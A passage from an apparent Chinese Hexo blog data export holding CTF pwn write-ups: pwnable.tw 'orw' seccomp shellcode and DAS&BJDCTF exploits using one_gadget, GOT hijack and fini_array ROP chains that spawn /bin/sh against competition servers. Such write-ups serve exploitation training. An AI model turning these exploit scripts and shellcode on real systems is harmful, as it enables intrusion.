sfp.filter = &sock_filter;\n  prctl(38, 1, 0, 0, 0);                        // prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0);\n  prctl(22, 2, &sfp);                           // prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&prog);\n```\n\n![img](/assets/images/2020-02-07-prctl&pwnable_orw/struct3.png)\n![img](/assets/images/2020-02-07-prctl&pwnable_orw/struct1.png)\n\n\n整个程序就是让我们输入一段shellcode，去打开提示所说的 **/home/orw/flag** \n\n\n```\n➜  seccomp-tools dump ./orw\n line  CODE  JT   JF      K\n=================================\n 0000: 0x20 0x00 0x00 0x00000004  A = arch\n 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011\n 0002: 0x20 0x00 0x00 0x00000000  A = sys_number\n 0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011\n 0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011\n 0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011\n 0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011\n 0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011\n 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011\n 0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011\n 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38)\n 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW\n```\n能用的函数：rt_sigreturn、sigreturn、exit_group、exit、open、read、write\n\n## exp\n```python\nfrom pwn import *\np = remote('chall.pwnable.tw',10001)\nshellcode = ''\n#open(/home/orw/flag,0,0)\nshellcode+=asm('mov eax,0x5;push 0x00006761;push 0x6c662f77;push 0x726f2f65;push 0x6d6f682f;mov ebx,esp;int 0x80;')\n#read(3,/home/orw/flag,0x30)\nshellcode +=asm('mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x30;int 0x80;')\n#write(1,/home/orw/flag,0x30)\nshellcode+=asm('mov eax,0x4; mov ebx,0x1;int 0x80;')\np.recvuntil(':')\np.send(shellcode)\np.interactive()\n```\n\n在 http://syscalls.kernelgrok.com/ 可以看到调用号和各寄存器作用\n","slug":"2020-02-05-prctl&pwnable_orw","published":1,"updated":"2020-07-03T16:12:50.812Z","comments":1,"photos":[],"link":"","_id":"ckc74vbl300074djx5xrt1s4z","content":"<h2 id=\"相关工具\"><a href=\"#相关工具\" class=\"headerlink\" title=\"相关工具\"></a>相关工具</h2><p>seccomp-tools <a href=\"https://github.com/david942j/seccomp-tools\" target=\"_blank\" rel=\"noopener\">https://github.com/david942j/seccomp-tools</a></p>\n<h2 id=\"orw\"><a href=\"#orw\" class=\"headerlink\" title=\"orw\"></a>orw</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Arch:     i386-32-little</span><br><span class=\"line\">RELRO:    Partial RELRO</span><br><span class=\"line\">Stack:    Canary found</span><br><span class=\"line\">NX:       NX disabled</span><br><span class=\"line\">PIE:      No PIE (0x8048000)</span><br><span class=\"line\">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>\n<p>拽进Ida，根据prctl函数可以确定几个结构体。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">qmemcpy(&amp;sock_filter, stru_8048640, 0x60u);</span><br><span class=\"line\">LOWORD(sfp.len) &#x3D; 12;</span><br><span class=\"line\">sfp.filter &#x3D; &amp;sock_filter;</span><br><span class=\"line\">prctl(38, 1, 0, 0, 0);                        &#x2F;&#x2F; prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0);</span><br><span class=\"line\">prctl(22, 2, &amp;sfp);                           &#x2F;&#x2F; prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;prog);</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/assets/images/2020-02-07-prctl&pwnable_orw/struct3.png\" alt=\"img\"><br><img src=\"/assets/images/2020-02-07-prctl&pwnable_orw/struct1.png\" alt=\"img\"></p>\n<p>整个程序就是让我们输入一段shellcode，去打开提示所说的 <strong>/home/orw/flag</strong> </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  seccomp-tools dump .&#x2F;orw</span><br><span class=\"line\"> line  CODE  JT   JF      K</span><br><span class=\"line\">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class=\"line\"> 0000: 0x20 0x00 0x00 0x00000004  A &#x3D; arch</span><br><span class=\"line\"> 0001: 0x15 0x00 0x09 0x40000003  if (A !&#x3D; ARCH_I386) goto 0011</span><br><span class=\"line\"> 0002: 0x20 0x00 0x00 0x00000000  A &#x3D; sys_number</span><br><span class=\"line\"> 0003: 0x15 0x07 0x00 0x000000ad  if (A &#x3D;&#x3D; rt_sigreturn) goto 0011</span><br><span class=\"line\"> 0004: 0x15 0x06 0x00 0x00000077  if (A &#x3D;&#x3D; sigreturn) goto 0011</span><br><span class=\"line\"> 0005: 0x15 0x05 0x00 0x000000fc  if (A &#x3D;&#x3D; exit_group) goto 0011</span><br><span class=\"line\"> 0006: 0x15 0x04 0x00 0x00000001  if (A &#x3D;&#x3D; exit) goto 0011</span><br><span class=\"line\"> 0007: 0x15 0x03 0x00 0x00000005  if (A &#x3D;&#x3D; open) goto 0011</span><br><span class=\"line\"> 0008: 0x15 0x02 0x00 0x00000003  if (A &#x3D;&#x3D; read) goto 0011</span><br><span class=\"line\"> 0009: 0x15 0x01 0x00 0x00000004  if (A &#x3D;&#x3D; write) goto 0011</span><br><span class=\"line\"> 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38)</span><br><span class=\"line\"> 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br></pre></td></tr></table></figure>\n<p>能用的函数：rt_sigreturn、sigreturn、exit_group、exit、open、read、write</p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">p = remote(<span class=\"string\">'chall.pwnable.tw'</span>,<span class=\"number\">10001</span>)</span><br><span class=\"line\">shellcode = <span class=\"string\">''</span></span><br><span class=\"line\"><span class=\"comment\">#open(/home/orw/flag,0,0)</span></span><br><span class=\"line\">shellcode+=asm(<span class=\"string\">'mov eax,0x5;push 0x00006761;push 0x6c662f77;push 0x726f2f65;push 0x6d6f682f;mov ebx,esp;int 0x80;'</span>)</span><br><span class=\"line\"><span class=\"comment\">#read(3,/home/orw/flag,0x30)</span></span><br><span class=\"line\">shellcode +=asm(<span class=\"string\">'mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x30;int 0x80;'</span>)</span><br><span class=\"line\"><span class=\"comment\">#write(1,/home/orw/flag,0x30)</span></span><br><span class=\"line\">shellcode+=asm(<span class=\"string\">'mov eax,0x4; mov ebx,0x1;int 0x80;'</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">':'</span>)</span><br><span class=\"line\">p.send(shellcode)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>在 <a href=\"http://syscalls.kernelgrok.com/\" target=\"_blank\" rel=\"noopener\">http://syscalls.kernelgrok.com/</a> 可以看到调用号和各寄存器作用</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"相关工具\"><a href=\"#相关工具\" class=\"headerlink\" title=\"相关工具\"></a>相关工具</h2><p>seccomp-tools <a href=\"https://github.com/david942j/seccomp-tools\" target=\"_blank\" rel=\"noopener\">https://github.com/david942j/seccomp-tools</a></p>\n<h2 id=\"orw\"><a href=\"#orw\" class=\"headerlink\" title=\"orw\"></a>orw</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Arch:     i386-32-little</span><br><span class=\"line\">RELRO:    Partial RELRO</span><br><span class=\"line\">Stack:    Canary found</span><br><span class=\"line\">NX:       NX disabled</span><br><span class=\"line\">PIE:      No PIE (0x8048000)</span><br><span class=\"line\">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>\n<p>拽进Ida，根据prctl函数可以确定几个结构体。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">qmemcpy(&amp;sock_filter, stru_8048640, 0x60u);</span><br><span class=\"line\">LOWORD(sfp.len) &#x3D; 12;</span><br><span class=\"line\">sfp.filter &#x3D; &amp;sock_filter;</span><br><span class=\"line\">prctl(38, 1, 0, 0, 0);                        &#x2F;&#x2F; prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0);</span><br><span class=\"line\">prctl(22, 2, &amp;sfp);                           &#x2F;&#x2F; prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;prog);</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/assets/images/2020-02-07-prctl&pwnable_orw/struct3.png\" alt=\"img\"><br><img src=\"/assets/images/2020-02-07-prctl&pwnable_orw/struct1.png\" alt=\"img\"></p>\n<p>整个程序就是让我们输入一段shellcode，去打开提示所说的 <strong>/home/orw/flag</strong> </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  seccomp-tools dump .&#x2F;orw</span><br><span class=\"line\"> line  CODE  JT   JF      K</span><br><span class=\"line\">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class=\"line\"> 0000: 0x20 0x00 0x00 0x00000004  A &#x3D; arch</span><br><span class=\"line\"> 0001: 0x15 0x00 0x09 0x40000003  if (A !&#x3D; ARCH_I386) goto 0011</span><br><span class=\"line\"> 0002: 0x20 0x00 0x00 0x00000000  A &#x3D; sys_number</span><br><span class=\"line\"> 0003: 0x15 0x07 0x00 0x000000ad  if (A &#x3D;&#x3D; rt_sigreturn) goto 0011</span><br><span class=\"line\"> 0004: 0x15 0x06 0x00 0x00000077  if (A &#x3D;&#x3D; sigreturn) goto 0011</span><br><span class=\"line\"> 0005: 0x15 0x05 0x00 0x000000fc  if (A &#x3D;&#x3D; exit_group) goto 0011</span><br><span class=\"line\"> 0006: 0x15 0x04 0x00 0x00000001  if (A &#x3D;&#x3D; exit) goto 0011</span><br><span class=\"line\"> 0007: 0x15 0x03 0x00 0x00000005  if (A &#x3D;&#x3D; open) goto 0011</span><br><span class=\"line\"> 0008: 0x15 0x02 0x00 0x00000003  if (A &#x3D;&#x3D; read) goto 0011</span><br><span class=\"line\"> 0009: 0x15 0x01 0x00 0x00000004  if (A &#x3D;&#x3D; write) goto 0011</span><br><span class=\"line\"> 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38)</span><br><span class=\"line\"> 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br></pre></td></tr></table></figure>\n<p>能用的函数：rt_sigreturn、sigreturn、exit_group、exit、open、read、write</p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">p = remote(<span class=\"string\">'chall.pwnable.tw'</span>,<span class=\"number\">10001</span>)</span><br><span class=\"line\">shellcode = <span class=\"string\">''</span></span><br><span class=\"line\"><span class=\"comment\">#open(/home/orw/flag,0,0)</span></span><br><span class=\"line\">shellcode+=asm(<span class=\"string\">'mov eax,0x5;push 0x00006761;push 0x6c662f77;push 0x726f2f65;push 0x6d6f682f;mov ebx,esp;int 0x80;'</span>)</span><br><span class=\"line\"><span class=\"comment\">#read(3,/home/orw/flag,0x30)</span></span><br><span class=\"line\">shellcode +=asm(<span class=\"string\">'mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x30;int 0x80;'</span>)</span><br><span class=\"line\"><span class=\"comment\">#write(1,/home/orw/flag,0x30)</span></span><br><span class=\"line\">shellcode+=asm(<span class=\"string\">'mov eax,0x4; mov ebx,0x1;int 0x80;'</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">':'</span>)</span><br><span class=\"line\">p.send(shellcode)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>在 <a href=\"http://syscalls.kernelgrok.com/\" target=\"_blank\" rel=\"noopener\">http://syscalls.kernelgrok.com/</a> 可以看到调用号和各寄存器作用</p>\n"},{"layout":"post","title":"DAS&BJDCTF Writeup","description":11,"date":"2020-05-23T16:00:00.000Z","_content":"\n### Oj_0\n\n先用printf泄露栈结构，查libc版本，onegadget一把梭。\n\n```python\nfrom pwn import *\ncontext.log_level = 'debug'\n\np = remote('183.129.189.60',**)\n\np.recv()\np.recvuntil('@')\np.recv()\n\n\npayload = \n'''\n    int main()\n    {\n        long int a[1];\n        a[3]+=282918;  #one_gadget\n        return 0;\n    } \n'''\np.sendline(payload)\np.interactive()\n```\n\n\n### OJ_1\n\n同样的，onegadget，用汇编写。\n附上链接\n[不用括号输出Hello,World](https://jlkl.github.io/2017/10/14/%E6%9C%89%E8%B6%A3%E7%9A%84%E2%80%9CHello%20World%E2%80%9D/)\n\n```python\nfrom pwn import *\ncontext.log_level = 'debug'\ncontext.arch='amd64'\n\np = remote('183.129.189.60',10002)\n\np.recv()\np.recvuntil('@')\np.recv()\n\ns = asm('''\n    push rbp\n    mov rbp,rsp\n    sub rsp,10\n    mov rax ,[rbp+8]\n    add rax, 0xd0917\n    mov [rbp+8],rax\n    leave\n    ret\n''')\n\nresult = ''\nresult += 'const char main=%s' % hex(ord(s[0]))\nfor i in range(1, len(s)):\n    result += ', main%d=%s' % (i, hex(ord(s[i])))\nresult += ';'\n\npayload = result+'@'\n\np.sendline(payload)\np.interactive()\n```\n\n### Memory_Monster_I\n\n劫持got表，触发canary。\n\n```python\nfrom pwn import *\ncontext.log_level = 'debug'\n\np = remote('183.129.189.60',10081)\n#p = process('./Memory_Monster_I')\nelf = ELF('./Memory_Monster_I')\n\n\ncheck_addr = 0x404028\npwn_addr = 0x040124a\n\n#gdb.attach(p,'b *0x401238')\np.recvuntil('r:')\npayload = p64(check_addr)+'a'*0x25\np.send(payload)\n\np.recvuntil('a:')\npayload = p64(pwn_addr)\np.send(payload)\n\np.interactive()\n```\n### Memory_Monster_II\n\n改写_fini_array[1]为main，_fini_array[0]为__libc_csu_fini,实现多次写。\n\n```python\nfrom pwn import *\ncontext.log_level = 'debug'\n\n#sh = remote('183.129.189.60',10104)\nsh = process('./Memory_Monster_II')\n\nfini_addr = 0x00000000004B80B0\nlibc_csu = 0x0000000000402CB0\nmain_addr = 0x0000000000401C1D\nleave_ret = 0x0000000000401CF3\nbin_addr = 0x0000000000492895\nesp = fini_addr + 0x10\nret = 0x0000000000401016\npop_rdx = 0x0000000000448415\npop_rax = 0x0000000000448fcc \npop_rsi = 0x0000000000406f80\npop_rdi = 0x0000000000401746\nsyscall = 0x0000000000402514 \n\ndef write(addr,data):\n    sh.recvuntil('addr:')\n    sh.send(p64(addr))\n    sh.recvuntil('data:')\n    sh.send(data)\n#gdb.attach(sh)\n\n\nwrite(fini_addr,p64(libc_csu)+p64(main_addr))\nwrite(esp,p64(pop_rax))\nwrite(esp+8,p64(0x3b))\nwrite(esp+16,p64(pop_rdi))\nwrite(esp+24,p64(bin_addr))\nwrite(esp+32,p64(pop_rsi))\nwrite(esp+40,p64(0))\nwrite(esp+48,p64(pop_rdx))\nwrite(esp+56,p64(0))\nwrite(esp+64,p64(syscall))\n\nwrite(fini_addr,p64(leave_ret)+p64(ret))\n\n\nsh.interactive()\n```\n\n\n\n### Memory_Monster_III\n\n同Memory_Monster_II，找个地方写入'/bin/sh\\x00'\n\n```python\nfrom pwn import *\ncontext.log_level = 'debug'\n\n#sh = remote('183.129.189.60',10008)\nsh = process('./Memory_Monster_III')\n\nfini_addr = 0x00000000004B50B0\nlibc_csu = 0x0000000000402CA0\nmain_addr = 0x0000000000401C1D\nleave_ret = 0x0000000000401CF3\nbin_addr = 0x00000000004bd790 \nesp = fini_addr + 0x10\nret = 0x0000000000401016\npop_rdx = 0x0000000000447635\npop_rax = 0x000000000044806c\npop_rsi = 0x0000000000406f70\npop_rdi = 0x0000000000401746 \nsyscall = 0x0000000000402504 \n\n\ndef write(addr,data):\n    sh.recvuntil('addr:')\n    sh.send(p64(addr))\n    sh.recvuntil('data:')\n    sh.send(data)\n#gdb.attach(sh)\n\nwrite(fini_addr,p64(libc_csu)+p64(main_addr))\n\nwrite(bin_addr,'/bin/sh\\x00')\nwrite(esp,p64(pop_rax))\nwrite(esp+8,p64(0x3b))\nwrite(esp+16,p64(pop_rdi))\nwrite(esp+24,p64(bin_addr))\nwrite(esp+32,p64(pop_rsi))\nwrite(esp+40,p64(0))\nwrite(esp+48,p64(pop_rdx))\nwrite(esp+56,p64(0))\nwrite(esp+64,p64(syscall))\n\nwrite(fini_addr,p64(leave_ret)+p64(ret))\n\n\nsh.interactive()\n```\n","source":"_posts/2020-05-24-DAS&BJDCTF Writeup.md","raw":"---\nlayout: post\ntitle: DAS&BJDCTF Writeup\ncategories: pwn\ntags: [pwn]\ndescription: 11\ndate: 2020-05-24\n---\n\n### Oj_0\n\n先用printf泄露栈结构，查libc版本，onegadget一把梭。\n\n```python\nfrom pwn import *\ncontext.log_level = 'debug'\n\np = remote('183.129.189.60',**)\n\np.recv()\np.recvuntil('@')\np.recv()\n\n\npayload = \n'''\n    int main()\n    {\n        long int a[1];\n        a[3]+=282918;  #one_gadget\n        return 0;\n    } \n'''\np.sendline(payload)\np.interactive()\n```\n\n\n### OJ_1\n\n同样的，onegadget，用汇编写。\n附上链接\n[不用括号输出Hello,World](https://jlkl.github.io/2017/10/14/%E6%9C%89%E8%B6%A3%E7%9A%84%E2%80%9CHello%20World%E2%80%9D/)\n\n```python\nfrom pwn import *\ncontext.log_level = 'debug'\ncontext.arch='amd64'\n\np = remote('183.129.189.60',10002)\n\np.recv()\np.recvuntil('@')\np.recv()\n\ns = asm('''\n    push rbp\n    mov rbp,rsp\n    sub rsp,10\n    mov rax ,[rbp+8]\n    add rax, 0xd0917\n    mov [rbp+8],rax\n    leave\n    ret\n''')\n\nresult = ''\nresult += 'const char main=%s' % hex(ord(s[0]))\nfor i in range(1, len(s)):\n    result += ', main%d=%s' % (i, hex(ord(s[i])))\nresult += ';'\n\npayload = result+'@'\n\np.sendline(payload)\np.interactive()\n```\n\n### Memory_Monster_I\n\n劫持got表，触发canary。\n\n```python\nfrom pwn import *\ncontext.log_level = 'debug'\n\np = remote('183.129.189.60',10081)\n#p = process('./Memory_Monster_I')\nelf = ELF('./Memory_Monster_I')\n\n\ncheck_addr = 0x404028\npwn_addr = 0x040124a\n\n#gdb.attach(p,'b *0x401238')\np.recvuntil('r:')\npayload = p64(check_addr)+'a'*0x25\np.send(payload)\n\np.recvuntil('a:')\npayload = p64(pwn_addr)\np.send(payload)\n\np.interactive()\n```\n### Memory_Monster_II\n\n改写_fini_array[1]为main，_fini_array[0]为__libc_csu_fini,实现多次写。\n\n```python\nfrom pwn import *\ncontext.log_level = 'debug'\n\n#sh = remote('183.129.189.60',10104)\nsh = process('./Memory_Monster_II')\n\nfini_addr = 0x00000000004B80B0\nlibc_csu = 0x0000000000402CB0\nmain_addr = 0x0000000000401C1D\nleave_ret = 0x0000000000401CF3\nbin_addr = 0x0000000000492895\nesp = fini_addr + 0x10\nret = 0x0000000000401016\npop_rdx = 0x0000000000448415\npop_rax = 0x0000000000448fcc \npop_rsi = 0x0000000000406f80\npop_rdi = 0x0000000000401746\nsyscall = 0x0000000000402514 \n\ndef write(addr,data):\n    sh.recvuntil('addr:')\n    sh.send(p64(addr))\n    sh.recvuntil('data:')\n    sh.send(data)\n#gdb.attach(sh)\n\n\nwrite(fini_addr,p64(libc_csu)+p64(main_addr))\nwrite(esp,p64(pop_rax))\nwrite(esp+8,p64(0x3b))\nwrite(esp+16,p64(pop_rdi))\nwrite(esp+24,p64(bin_addr))\nwrite(esp+32,p64(pop_rsi))\nwrite(esp+40,p64(0))\nwrite(esp+48,p64(pop_rdx))\nwrite(esp+56,p64(0))\nwrite(esp+64,p64(syscall))\n\nwrite(fini_addr,p64(leave_ret)+p64(ret))\n\n\nsh.interactive()\n```\n\n\n\n### Memory_Monster_III\n\n同Memory_Monster_II，找个地方写入'/bin/sh\\x00'\n\n```python\nfrom pwn import *\ncontext.log_level = 'debug'\n\n#sh = remote('183.129.189.60',10008)\nsh = process('./Memory_Monster_III')\n\nfini_addr = 0x00000000004B50B0\nlibc_csu = 0x0000000000402CA0\nmain_addr = 0x0000000000401C1D\nleave_ret = 0x0000000000401CF3\nbin_addr = 0x00000000004bd790 \nesp = fini_addr + 0x10\nret = 0x0000000000401016\npop_rdx = 0x0000000000447635\npop_rax = 0x000000000044806c\npop_rsi = 0x0000000000406f70\npop_rdi = 0x0000000000401746 \nsyscall = 0x0000000000402504 \n\n\ndef write(addr,data):\n    sh.recvuntil('addr:')\n    sh.send(p64(addr))\n    sh.recvuntil('data:')\n    sh.send(data)\n#gdb.attach(sh)\n\nwrite(fini_addr,p64(libc_csu)+p64(main_addr))\n\nwrite(bin_addr,'/bin/sh\\x00')\nwrite(esp,p64(pop_rax))\nwrite(esp+8,p64(0x3b))\nwrite(esp+16,p64(pop_rdi))\nwrite(esp+24,p64(bin_addr))\nwrite(esp+32,p64(pop_rsi))\nwrite(esp+40,p64(0))\nwrite(esp+48,p64(pop_rdx))\nwrite(esp+56,p64(0))\nwrite(esp+64,p64(syscall))\n\nwrite(fini_addr,p64(leave_ret)+p64(ret))\n\n\nsh.interactive()\n```\n","slug":"2020-05-24-DAS&BJDCTF Writeup","published":1,"updated":"2020-07-03T16:12:55.340Z","comments":1,"photos":[],"link":"","_id":"ckc74vbl500084djxbts8c55i","content":"<h3 id=\"Oj-0\"><a href=\"#Oj-0\" class=\"headerlink\" title=\"Oj_0\"></a>Oj_0</h3><p>先用printf泄露栈结构，查libc版本，onegadget一把梭。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">'debug'</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = remote(<span class=\"string\">'183.129.189.60'</span>,**)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recv()</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">'@'</span>)</span><br><span class=\"line\">p.recv()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">payload = </span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">    int main()</span></span><br><span class=\"line\"><span class=\"string\">    &#123;</span></span><br><span class=\"line\"><span class=\"string\">        long int a[1];</span></span><br><span class=\"line\"><span class=\"string\">        a[3]+=282918;  #one_gadget</span></span><br><span class=\"line\"><span class=\"string\">        return 0;</span></span><br><span class=\"line\"><span class=\"string\">    &#125; </span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n\n<h3 id=\"OJ-1\"><a href=\"#OJ-1\" class=\"headerlink\" title=\"OJ_1\"></a>OJ_1</h3><p>同样的，onegadget，用汇编写。<br>附上链接<br><a href=\"https://jlkl.github.io/2017/10/14/%E6%9C%89%E8%B6%A3%E7%9A%84%E2%80%9CHello%20World%E2%80%9D/\" target=\"_blank\" rel=\"noopener\">不用括号输出Hello,World</a></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">'debug'</span></span><br><span class=\"line\">context.arch=<span class=\"string\">'amd64'</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = remote(<span class=\"string\">'183.129.189.60'</span>,<span class=\"number\">10002</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recv()</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">'@'</span>)</span><br><span class=\"line\">p.recv()</span><br><span class=\"line\"></span><br><span class=\"line\">s = asm(<span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">    push rbp</span></span><br><span class=\"line\"><span class=\"string\">    mov rbp,rsp</span></span><br><span class=\"line\"><span class=\"string\">    sub rsp,10</span></span><br><span class=\"line\"><span class=\"string\">    mov rax ,[rbp+8]</span></span><br><span class=\"line\"><span class=\"string\">    add rax, 0xd0917</span></span><br><span class=\"line\"><span class=\"string\">    mov [rbp+8],rax</span></span><br><span class=\"line\"><span class=\"string\">    leave</span></span><br><span class=\"line\"><span class=\"string\">    ret</span></span><br><span class=\"line\"><span class=\"string\">'''</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">result = <span class=\"string\">''</span></span><br><span class=\"line\">result += <span class=\"string\">'const char main=%s'</span> % hex(ord(s[<span class=\"number\">0</span>]))</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span 